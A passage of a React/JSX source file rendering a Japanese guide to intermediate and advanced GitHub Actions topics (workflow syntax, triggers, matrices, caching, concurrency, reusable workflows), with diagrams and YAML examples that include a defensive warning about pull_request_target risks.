import React from 'react';
import Mermaid from '../../components/Mermaid';
import NavBar from './NavBar';
import './github-actions-guide.css';

const DIAGRAM_2_1 = `flowchart TD
A["リポジトリ内のイベント発生<br/>push / pull_request / schedule など"] --> B{".github/workflows/<br/>配下のワークフローを検索"}
B --> C["ワークフロー実行開始"]
C --> D["ジョブ1: build"]
C --> E["ジョブ2: lint"]
D --> F["ジョブ3: test<br/>needs: build"]
E --> F
F --> G{"needsで依存関係<br/>を満たしたか"}
G -->|Yes| H["ジョブ4: deploy<br/>environment: production"]
H --> I["承認者によるレビュー<br/>Required Reviewers"]
I --> J["デプロイ実行"]`;

const DIAGRAM_8_1 = `flowchart LR
subgraph Caller["呼び出し元ワークフロー"]
J1["job: call-build"]
end
subgraph RW["再利用可能なワークフロー<br/>reusable-build.yml"]
J2["job: build"]
J3["job: test"]
J2 --> J3
end
subgraph CA["複合アクション<br/>action.yml"]
S1["step: checkout"]
S2["step: setup-python"]
S3["step: pip install"]
S1 --> S2 --> S3
end
J1 -->|uses: workflow_call| RW
J2 -->|1ステップとして呼び出し| CA`;

const DIAGRAM_10_1 = `sequenceDiagram
participant Dev as 開発者
participant GH as GitHub Actions
participant Env as production環境
participant Rev as 承認者

Dev->>GH: mainブランチへpush
GH->>GH: build / test ジョブ実行
GH->>Env: production環境を参照するジョブを開始
Env->>Env: デプロイブランチ制限をチェック
Env->>Rev: 承認リクエスト送信
Rev-->>Env: 承認 (Required Reviewers)
Env->>Env: Wait Timerを消化
Env-->>GH: シークレットへのアクセスを許可
GH->>GH: デプロイステップを実行`;

const DIAGRAM_11_1 = `sequenceDiagram
participant Job as GitHub Actions ジョブ
participant OIDC as GitHub OIDCプロバイダー
participant Cloud as クラウドプロバイダー(AWS等)

Job->>OIDC: id-token: write権限でJWTを要求
OIDC-->>Job: 短命JWT(sub, repository, ref等のクレーム含む)
Job->>Cloud: JWTを提示してロールの引き受けを要求
Cloud->>Cloud: 信頼ポリシーのCondition(sub等)を検証
Cloud-->>Job: 短命アクセストークンを発行(ジョブ実行中のみ有効)
Job->>Cloud: 短命トークンでリソースにアクセス`;

const DIAGRAM_12_1 = `flowchart TD
subgraph safe["pull_request (安全な既定動作)"]
A1["フォークからPR送信"] --> A2["マージコミットのコンテキストで実行"]
A2 --> A3["GITHUB_TOKENは読み取り専用<br/>シークレットへのアクセス不可"]
end

subgraph danger["pull_request_target (要注意)"]
B1["フォークからPR送信"] --> B2["ベースリポジトリのコンテキストで実行"]
B2 --> B3["GITHUB_TOKENは読み書き可能<br/>シークレットにアクセス可能"]
B3 --> B4{"フォークのコードを<br/>明示的にcheckoutしたか"}
B4 -->|Yes: 危険| B5["攻撃者のコードが<br/>高権限で実行される"]
B4 -->|No: 既定動作のまま| B6["ベースブランチの信頼済み<br/>コードのみ実行される"]
end`;

const DIAGRAM_16_1 = `flowchart LR
A["push / pull_request"] --> B["test<br/>(matrix: node 20/22)"]
B --> C["build<br/>+ Artifact Attestation生成"]
C --> D{"mainブランチか"}
D -->|Yes| E["production環境を参照"]
E --> F["Required Reviewers承認"]
F --> G["OIDCでAWSロールを引き受け"]
G --> H["S3へデプロイ"]
D -->|No| I["デプロイをスキップ"]`;

export default function GithubActionsGuidePage() {
  return (
    <div className="github-actions-page">
      <div className="layout">
        <NavBar />

        <main className="main-content">
          <header className="hero">
            <span className="eyebrow">CI/CD · DevSecOps · 2026年7月時点調査</span>
            <h1>GitHub Actions 中級〜上級者向け完全ガイド</h1>
            <p className="lead">
              基本的なワークフローは書けるが、再利用可能なワークフロー・セキュリティハードニング・
              サプライチェーン保護・コスト最適化まで踏み込みたいエンジニア・QAエンジニアのための、
              公式ドキュメントおよび信頼できる一次情報源に基づく実践ガイド。
            </p>
            <div className="hero-meta">
              <span className="meta-chip">全18章</span>
              <span className="meta-chip">図解: Mermaid</span>
              <span className="meta-chip">対象: 中級〜上級</span>
              <span className="meta-chip">主要参照: docs.github.com/en/actions</span>
            </div>
          </header>

          {/* ============ SECTION 1 ============ */}
          <section id="sec-1">
            <div className="section-head">
              <span className="section-num">01</span>
              <h2>はじめに</h2>
            </div>

            <p>
              GitHub Actionsは、GitHubリポジトリに組み込まれたCI/CD兼汎用自動化プラットフォームである。
              YAMLファイルでワークフローを定義し、プッシュ・プルリクエスト・スケジュール・手動実行といった
              イベントをトリガーとして、ビルド・テスト・デプロイのパイプラインからIssue/PRの自動ラベリングまで、
              開発ライフサイクル全体を自動化できる。
            </p>

            <p>
              基本文法(<code>on</code> / <code>jobs</code> / <code>steps</code>)を習得した後に多くのチームがぶつかる壁は、次のようなものである。
            </p>

            <ul>
              <li>ワークフローファイルの重複をどう解消するか(再利用可能なワークフロー・複合アクション)</li>
              <li>サードパーティアクションやセルフホストランナーをどこまで信頼してよいか</li>
              <li>クラウド認証情報をどうやって長期保存せずに扱うか(OIDC)</li>
              <li><code>pull_request_target</code>のような強力だが危険なトリガーをどう安全に使うか</li>
              <li>ビルド成果物の出所をどう証明するか(SLSA・Artifact Attestations)</li>
              <li>2026年の値付け変更を踏まえて実行コストをどう最適化するか</li>
            </ul>

            <p>
              本ガイドはこれらのテーマを、公式ドキュメントおよび信頼できる一次情報源を参照しながら、ステップバイステップで解説する。
            </p>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions" target="_blank" rel="noopener noreferrer">
                  docs.github.com/en/actions
                </a>{' '}
                ·{' '}
                <a href="https://github.com/features/actions?locale=ja" target="_blank" rel="noopener noreferrer">
                  github.com/features/actions (日本語)
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 2 ============ */}
          <section id="sec-2">
            <div className="section-head">
              <span className="section-num">02</span>
              <h2>GitHub Actionsのアーキテクチャ全体像</h2>
            </div>

            <p>
              GitHub Actionsは「ワークフロー」「ジョブ」「ステップ」「ランナー」「アクション」という5つの概念で構成される。
            </p>

            <div className="table-wrap">
              <table>
                <thead>
                  <tr>
                    <th>用語</th>
                    <th>説明</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>ワークフロー (Workflow)</td>
                    <td>
                      <code>.github/workflows/</code>配下のYAMLファイルで定義される、1つ以上のジョブから成る自動化プロセス全体
                    </td>
                  </tr>
                  <tr>
                    <td>ジョブ (Job)</td>
                    <td>同一ランナー上で実行されるステップの集合。デフォルトでは依存関係のないジョブは並列実行される</td>
                  </tr>
                  <tr>
                    <td>ステップ (Step)</td>
                    <td>シェルコマンドの実行、またはアクションの呼び出し。同一ジョブ内のステップは順番に実行され、ファイルシステムを共有する</td>
                  </tr>
                  <tr>
                    <td>ランナー (Runner)</td>
                    <td>ジョブを実行する仮想マシンまたはコンテナ。GitHubホスト型(Ubuntu/Windows/macOS)とセルフホスト型がある</td>
                  </tr>
                  <tr>
                    <td>アクション (Action)</td>
                    <td>再利用可能な処理単位。JavaScript製・Docker製・複合(Composite)アクションの3種類がある</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <p>
              ワークフローはYAMLファイルとしてリポジトリにチェックインされ、リポジトリ内のイベントによって
              トリガーされるほか、手動やスケジュールでも実行できる。ジョブはそれぞれ独自の仮想マシンランナー、
              またはコンテナ内で実行され、1つ以上のステップを持つ点が重要である。
            </p>

            <div className="diagram-block">
              <div className="diagram-caption">Fig. 2-1 — ワークフロー実行の全体フロー</div>
              <Mermaid chart={DIAGRAM_2_1} />
            </div>

            <p>
              各ジョブは既定では並列に実行され、<code>needs</code>キーで依存関係を宣言した場合のみ順次実行される。
              ジョブが別のジョブに依存する場合、依存先のジョブが完了するまで待機するという挙動は、
              ビルド→テスト→デプロイのようなパイプライン設計の基本になる。
            </p>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions" target="_blank" rel="noopener noreferrer">
                  docs.github.com/en/actions
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/actions/get-started/understand-github-actions" target="_blank" rel="noopener noreferrer">
                  GitHub Actionsを理解する
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/actions/get-started/quickstart" target="_blank" rel="noopener noreferrer">
                  クイックスタート
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/actions/concepts/workflows-and-actions/workflows" target="_blank" rel="noopener noreferrer">
                  ワークフローの概念
                </a>{' '}
                ·{' '}
                <a href="https://github.com/features/actions?locale=ja" target="_blank" rel="noopener noreferrer">
                  GitHub Actions製品ページ
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 3 ============ */}
          <section id="sec-3">
            <div className="section-head">
              <span className="section-num">03</span>
              <h2>ワークフロー構文: 基礎から応用へ</h2>
            </div>

            <p>
              ワークフローファイルは<code>.github/workflows/*.yml</code>に配置する。
              中級者以上が押さえておくべき主要キーは以下の通り。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>.github/workflows/ci.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">name</span>: <span className="str">CI Pipeline</span></div>
                <div className="code-line"><span className="kw">run-name</span>: <span className="val">${'{'}{'{'} github.actor {'}'}{'}'} によるCI実行</span></div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">on</span>:</div>
                <div className="code-line">  <span className="prop">push</span>:</div>
                <div className="code-line">    <span className="prop">branches</span>: [main]</div>
                <div className="code-line">    <span className="prop">paths-ignore</span>:</div>
                <div className="code-line">      - <span className="str">"docs/**"</span></div>
                <div className="code-line">  <span className="prop">pull_request</span>:</div>
                <div className="code-line">    <span className="prop">branches</span>: [main]</div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">permissions</span>:</div>
                <div className="code-line">  <span className="prop">contents</span>: read   <span className="cm"># ワークフロー全体のGITHUB_TOKENをread-onlyに固定(最小権限)</span></div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">defaults</span>:</div>
                <div className="code-line">  <span className="prop">run</span>:</div>
                <div className="code-line">    <span className="prop">shell</span>: bash</div>
                <div className="code-line">    <span className="prop">working-directory</span>: ./app</div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">concurrency</span>:</div>
                <div className="code-line">  <span className="prop">group</span>: ci-<span className="val">${'{'}{'{'} github.ref {'}'}{'}'}</span></div>
                <div className="code-line">  <span className="prop">cancel-in-progress</span>: <span className="val">true</span></div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">build</span>:</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="prop">name</span>: Check out repository code</div>
                <div className="code-line">        <span className="kw">uses</span>: actions/checkout@v6</div>
                <div className="code-line">      - <span className="prop">name</span>: List files in the repository</div>
                <div className="code-line">        <span className="kw">run</span>: ls <span className="val">${'{'}{'{'} github.workspace {'}'}{'}'}</span></div>
              </div>
            </div>

            <ul>
              <li>
                <code>paths</code> / <code>paths-ignore</code> / <code>branches</code> / <code>branches-ignore</code>は、
                ワイルドカード(<code>*</code>, <code>**</code>)を使ったglobパターンでフィルタできる。
                パスフィルタでワークフローがスキップされた場合、それに関連付けられたチェックは“Pending”状態のままになるため、
                必須ステータスチェックに指定しているワークフローをパスフィルタでスキップすると、PRがマージできなくなる点に注意する。
              </li>
              <li>
                <code>permissions</code>はトップレベルキーとしてワークフロー全体に適用することも、特定のジョブ内で指定することもできる。
                ジョブレベルで指定した権限は、そのジョブ内でGITHUB_TOKENを使うすべてのアクション・runコマンドに適用される。
              </li>
              <li>
                <code>defaults.run</code>でシェルや作業ディレクトリを一括指定すれば、各ステップでの重複記述を減らせる。
              </li>
            </ul>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/actions/using-workflows/workflow-syntax-for-github-actions" target="_blank" rel="noopener noreferrer">
                  ワークフロー構文リファレンス
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/actions/reference/workflows-and-actions" target="_blank" rel="noopener noreferrer">
                  ワークフロー・アクションのリファレンス全体
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 4 ============ */}
          <section id="sec-4">
            <div className="section-head">
              <span className="section-num">04</span>
              <h2>トリガーイベントを使いこなす</h2>
            </div>

            <div className="table-wrap">
              <table>
                <thead>
                  <tr>
                    <th>イベント</th>
                    <th>主な用途</th>
                    <th>注意点</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><code>push</code></td>
                    <td>ブランチ・タグへのプッシュで実行</td>
                    <td><code>branches</code>/<code>tags</code>でフィルタ可能</td>
                  </tr>
                  <tr>
                    <td><code>pull_request</code></td>
                    <td>PRのopen/synchronize/reopen等で実行</td>
                    <td>フォークからのPRでは<code>GITHUB_TOKEN</code>が読み取り専用になり、シークレットへのアクセスも制限される</td>
                  </tr>
                  <tr>
                    <td><code>pull_request_target</code></td>
                    <td>ベースリポジトリのコンテキストで実行、シークレット・書き込み権限あり</td>
                    <td>極めて危険。詳細は12章を参照</td>
                  </tr>
                  <tr>
                    <td><code>schedule</code></td>
                    <td>cron式による定期実行</td>
                    <td><code>@yearly</code>等の非標準構文は非対応。UTC基準</td>
                  </tr>
                  <tr>
                    <td><code>workflow_dispatch</code></td>
                    <td>UI/APIからの手動実行、入力パラメータ定義可</td>
                    <td>デプロイ承認フローの起点によく使われる</td>
                  </tr>
                  <tr>
                    <td><code>repository_dispatch</code></td>
                    <td>GitHub外部からのAPI呼び出しでトリガー</td>
                    <td><code>event_type</code>で種別を判定し外部システム連携に利用</td>
                  </tr>
                  <tr>
                    <td><code>workflow_call</code></td>
                    <td>他のワークフローから呼び出し可能にする</td>
                    <td>8章で詳説</td>
                  </tr>
                  <tr>
                    <td><code>workflow_run</code></td>
                    <td>別ワークフロー完了後に実行</td>
                    <td>特権処理をPRトリガーから分離する際に有効</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <p>
              <code>schedule</code>イベントでは複数のcron式を定義でき、<code>github.event.schedule</code>コンテキストで
              どのcron式がトリガーしたかを判定できる。以下は月〜木の5:30に加えて火・木は17:30にも実行しつつ、
              片方のスケジュールでは特定ステップをスキップする例である。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>schedule.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">on</span>:</div>
                <div className="code-line">  <span className="prop">schedule</span>:</div>
                <div className="code-line">    - <span className="prop">cron</span>: <span className="str">'30 5 * * 1,3'</span></div>
                <div className="code-line">    - <span className="prop">cron</span>: <span className="str">'30 5,17 * * 2,4'</span></div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">test_schedule</span>:</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="prop">name</span>: 月・水以外のみ実行</div>
                <div className="code-line">        <span className="kw">if</span>: <span className="val">github.event.schedule != '30 5 * * 1,3'</span></div>
                <div className="code-line">        <span className="kw">run</span>: echo "月・水はスキップ"</div>
              </div>
            </div>

            <p>
              <code>workflow_dispatch</code>は手動デプロイやオンデマンドのメンテナンスタスクに最適で、
              GitHub UIまたはAPI経由で手動トリガーでき、動的なワークフローのために入力を定義できる。
              <code>repository_dispatch</code>は外部システム(監視ツール・Slack Bot・他リポジトリ)からのAPI呼び出しでワークフローを起動する用途に使う。
            </p>

            <div className="callout warn">
              <div className="callout-title">補足</div>
              <p>
                GITHUB_TOKENで作成・承認されたイベント(<code>workflow_dispatch</code>・<code>repository_dispatch</code>を除く)は
                再帰的なワークフロー実行を防ぐため、通常は新たなワークフロー実行をトリガーしない仕様になっている点も覚えておきたい。
              </p>
            </div>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows" target="_blank" rel="noopener noreferrer">
                  トリガーイベント一覧
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target" target="_blank" rel="noopener noreferrer">
                  pull_request_targetを安全に使う
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 5 ============ */}
          <section id="sec-5">
            <div className="section-head">
              <span className="section-num">05</span>
              <h2>マトリックス戦略による並列実行</h2>
            </div>

            <p>
              <code>strategy.matrix</code>は、OS・言語バージョン・環境などの組み合わせごとにジョブを自動生成する。
              <code>exclude</code>で特定の組み合わせを除外でき、あるジョブの出力を別ジョブのマトリックス定義に使うこともできる。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>matrix-test.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">test</span>:</div>
                <div className="code-line">    <span className="prop">strategy</span>:</div>
                <div className="code-line">      <span className="prop">fail-fast</span>: <span className="val">false</span>        <span className="cm"># 1つの失敗で他ジョブを止めない</span></div>
                <div className="code-line">      <span className="prop">max-parallel</span>: <span className="num">4</span>         <span className="cm"># 同時実行数の上限</span></div>
                <div className="code-line">      <span className="prop">matrix</span>:</div>
                <div className="code-line">        <span className="prop">os</span>: [ubuntu-latest, windows-latest, macos-latest]</div>
                <div className="code-line">        <span className="prop">node-version</span>: [18, 20, 22]</div>
                <div className="code-line">        <span className="prop">exclude</span>:</div>
                <div className="code-line">          - <span className="prop">os</span>: windows-latest</div>
                <div className="code-line">            <span className="prop">node-version</span>: <span className="num">18</span></div>
                <div className="code-line">    <span className="prop">runs-on</span>: <span className="val">${'{'}{'{'} matrix.os {'}'}{'}'}</span></div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/checkout@v6</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/setup-node@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">node-version</span>: <span className="val">${'{'}{'{'} matrix.node-version {'}'}{'}'}</span></div>
                <div className="code-line">          <span className="prop">cache</span>: npm</div>
                <div className="code-line">      - <span className="kw">run</span>: npm ci</div>
                <div className="code-line">      - <span className="kw">run</span>: npm test</div>
              </div>
            </div>

            <p>動的マトリックス(前段ジョブの出力から生成)も実務でよく使われるパターンである。</p>

            <div className="code-block">
              <div className="code-header">
                <span>dynamic-matrix.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">setup</span>:</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">outputs</span>:</div>
                <div className="code-line">      <span className="prop">matrix</span>: <span className="val">${'{'}{'{'} steps.set-matrix.outputs.matrix {'}'}{'}'}</span></div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="prop">id</span>: set-matrix</div>
                <div className="code-line">        <span className="kw">run</span>: |</div>
                <div className="code-line">{'          echo \'matrix={"include":[{"env":"staging"},{"env":"prod"}]}\' >> "$GITHUB_OUTPUT"'}</div>
                <div className="code-line"></div>
                <div className="code-line">  <span className="prop">deploy</span>:</div>
                <div className="code-line">    <span className="prop">needs</span>: setup</div>
                <div className="code-line">    <span className="prop">strategy</span>:</div>
                <div className="code-line">      <span className="prop">matrix</span>: <span className="val">${'{'}{'{'} fromJson(needs.setup.outputs.matrix) {'}'}{'}'}</span></div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">run</span>: echo "Deploying to <span className="val">${'{'}{'{'} matrix.env {'}'}{'}'}</span>"</div>
              </div>
            </div>

            <div className="callout success">
              <div className="callout-title">運用上のポイント</div>
              <ul>
                <li><code>fail-fast: false</code>はデバッグ時に有効。全組み合わせの結果を見てから判断したい場合に使う。</li>
                <li>マトリックスは1ワークフロー実行あたり最大256ジョブまで生成できる。</li>
                <li>マトリックスジョブごとにキャッシュキーを分ける(6章)ことで、キャッシュの衝突を避けられる。</li>
              </ul>
            </div>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/examples/using-concurrency-expressions-and-a-test-matrix" target="_blank" rel="noopener noreferrer">
                  並行実行・マトリックスの例
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 6 ============ */}
          <section id="sec-6">
            <div className="section-head">
              <span className="section-num">06</span>
              <h2>依存関係のキャッシュとアーティファクト管理</h2>
            </div>

            <h3>6.1 actions/cacheによるキャッシュ</h3>
            <p>
              依存関係のキャッシュは、<code>npm ci</code>や<code>pip install</code>などの再実行を避けて
              ワークフローの実行時間を大幅に短縮する。キャッシュキーには、依存関係ファイルのハッシュを含めるのが定石である。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>cache.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line">- <span className="prop">name</span>: Cache node_modules</div>
                <div className="code-line">  <span className="kw">uses</span>: actions/cache@v4</div>
                <div className="code-line">  <span className="kw">with</span>:</div>
                <div className="code-line">    <span className="prop">path</span>: |</div>
                <div className="code-line">      ~/.npm</div>
                <div className="code-line">      node_modules</div>
                <div className="code-line">    <span className="prop">key</span>: <span className="val">${'{'}{'{'} runner.os {'}'}{'}'}</span>-node-<span className="val">${'{'}{'{'} hashFiles('**/package-lock.json') {'}'}{'}'}</span></div>
                <div className="code-line">    <span className="prop">restore-keys</span>: |</div>
                <div className="code-line">      <span className="val">${'{'}{'{'} runner.os {'}'}{'}'}</span>-node-</div>
              </div>
            </div>

            <p>
              <code>hashFiles('package-lock.json')</code>によって、ロックファイルが変わらない限りキャッシュが
              ヒットし続ける。<code>restore-keys</code>はキーが完全一致しない場合のフォールバックとして機能し、
              部分一致するキャッシュから復元できる。キャッシュは7日間アクセスがないと自動的に失効し、
              既定ではブランチ単位でスコープされる(featureブランチは既定ブランチのキャッシュを読み取り専用で利用できる)。
            </p>

            <h3>6.2 actions/upload-artifact / download-artifact</h3>
            <p>ジョブ間でファイルを受け渡す場合は、環境変数ではなくアーティファクトを使う。</p>

            <div className="code-block">
              <div className="code-header">
                <span>artifacts.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">build</span>:</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/checkout@v6</div>
                <div className="code-line">      - <span className="kw">run</span>: npm run build</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/upload-artifact@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">name</span>: dist</div>
                <div className="code-line">          <span className="prop">path</span>: dist/</div>
                <div className="code-line">          <span className="prop">retention-days</span>: <span className="num">14</span></div>
                <div className="code-line"></div>
                <div className="code-line">  <span className="prop">deploy</span>:</div>
                <div className="code-line">    <span className="prop">needs</span>: build</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/download-artifact@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">name</span>: dist</div>
                <div className="code-line">          <span className="prop">path</span>: dist/</div>
                <div className="code-line">      - <span className="kw">run</span>: ./deploy.sh</div>
              </div>
            </div>

            <p>
              小さな値(文字列・数値)はジョブの<code>outputs</code>で受け渡し、ファイルはアーティファクトで
              受け渡す、という使い分けが基本方針となる。また、アーティファクトの保持期間(<code>retention-days</code>)を
              明示的に設定し、不要なストレージコストを避けることも運用上重要である。
            </p>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/concepts/workflows-and-actions" target="_blank" rel="noopener noreferrer">
                  ワークフローとアクションの概念
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 7 ============ */}
          <section id="sec-7">
            <div className="section-head">
              <span className="section-num">07</span>
              <h2>並行実行制御(concurrency)</h2>
            </div>

            <p>
              <code>concurrency</code>キーを使うと、同一グループ内で同時に実行できるワークフロー(またはジョブ)を
              1つに制限できる。PRへの連続プッシュで古い実行を自動キャンセルする、デプロイの多重実行を防ぐ、
              といった用途に使う。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>concurrency.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">concurrency</span>:</div>
                <div className="code-line">  <span className="prop">group</span>: <span className="str">'${'{'}{'{'} github.workflow {'}'}{'}'}-${'{'}{'{'} github.event.pull_request.number || github.ref {'}'}{'}'}'</span></div>
                <div className="code-line">  <span className="prop">cancel-in-progress</span>: <span className="val">true</span></div>
              </div>
            </div>

            <p>
              デプロイジョブでは<code>cancel-in-progress: false</code>にして、進行中のデプロイを安全に完了させてから
              次のデプロイを開始する設計が推奨される。環境(Environment)単位で同時デプロイを1つに制限する用途にも
              <code>concurrency</code>は有効に機能する。
            </p>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/examples/using-concurrency-expressions-and-a-test-matrix" target="_blank" rel="noopener noreferrer">
                  並行実行・マトリックスの例
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/control-deployments" target="_blank" rel="noopener noreferrer">
                  デプロイ制御
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 8 ============ */}
          <section id="sec-8">
            <div className="section-head">
              <span className="section-num">08</span>
              <h2>再利用可能なワークフロー vs 複合アクション</h2>
            </div>

            <p>
              コードの重複を避ける手段として、GitHub Actionsは「再利用可能なワークフロー(Reusable Workflows)」と
              「複合アクション(Composite Actions)」という2つの異なるレベルの再利用機構を提供している。
              両者は似ているが、設計思想と制約が異なるため使い分けが重要である。
            </p>

            <h3>8.1 比較表</h3>
            <div className="table-wrap">
              <table>
                <thead>
                  <tr>
                    <th>観点</th>
                    <th>再利用可能なワークフロー</th>
                    <th>複合アクション</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td>再利用の単位</td>
                    <td>1つ以上のジョブ全体</td>
                    <td>1つのジョブ内の複数ステップ</td>
                  </tr>
                  <tr>
                    <td>呼び出し方法</td>
                    <td>ジョブレベルで<code>uses:</code>(<code>workflow_call</code>)</td>
                    <td>ステップとして<code>uses:</code></td>
                  </tr>
                  <tr>
                    <td>複数ジョブ・別ランナー</td>
                    <td>可能(ジョブごとに<code>runs-on</code>を変えられる)</td>
                    <td>不可(常に呼び出し元と同じランナー)</td>
                  </tr>
                  <tr>
                    <td>シークレットの受け渡し</td>
                    <td>明示的に受け渡し可能</td>
                    <td>直接アクセス不可(inputs経由で渡す)</td>
                  </tr>
                  <tr>
                    <td>ネスト</td>
                    <td>最大10階層、1ファイルから最大50個まで呼び出し可能</td>
                    <td>最大10階層までネスト可能</td>
                  </tr>
                  <tr>
                    <td>ログの表示</td>
                    <td>ジョブ単位で個別に表示</td>
                    <td>呼び出し元の1ステップとしてまとめて表示</td>
                  </tr>
                  <tr>
                    <td>保存場所</td>
                    <td><code>.github/workflows/</code>直下(サブディレクトリ不可)</td>
                    <td>独自ディレクトリ + <code>action.yml</code></td>
                  </tr>
                  <tr>
                    <td>呼び出し後の追加ステップ</td>
                    <td>不可</td>
                    <td>可能(前後に他のステップを挟める)</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="callout success">
              <div className="callout-title">選定指針</div>
              <p>
                ステップが呼び出し元のジョブと異なる種類のマシンで実行される必要がある場合は、複合アクションではなく
                再利用可能なワークフローを使うべきである、という指針が公式ドキュメントでも明示されている。
                逆に、Marketplaceへの公開を前提とした汎用的なステップ群には複合アクションが向いている。
              </p>
            </div>

            <h3>8.2 再利用可能なワークフローの例</h3>
            <div className="code-block">
              <div className="code-header">
                <span>.github/workflows/reusable-build.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">name</span>: <span className="str">Reusable Build</span></div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">on</span>:</div>
                <div className="code-line">  <span className="prop">workflow_call</span>:</div>
                <div className="code-line">    <span className="prop">inputs</span>:</div>
                <div className="code-line">      <span className="prop">node-version</span>:</div>
                <div className="code-line">        <span className="prop">type</span>: string</div>
                <div className="code-line">        <span className="prop">default</span>: <span className="str">'20'</span></div>
                <div className="code-line">    <span className="prop">secrets</span>:</div>
                <div className="code-line">      <span className="prop">NPM_TOKEN</span>:</div>
                <div className="code-line">        <span className="prop">required</span>: <span className="val">true</span></div>
                <div className="code-line">    <span className="prop">outputs</span>:</div>
                <div className="code-line">      <span className="prop">artifact-name</span>:</div>
                <div className="code-line">        <span className="prop">value</span>: <span className="val">${'{'}{'{'} jobs.build.outputs.artifact-name {'}'}{'}'}</span></div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">build</span>:</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">outputs</span>:</div>
                <div className="code-line">      <span className="prop">artifact-name</span>: dist</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/checkout@v6</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/setup-node@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
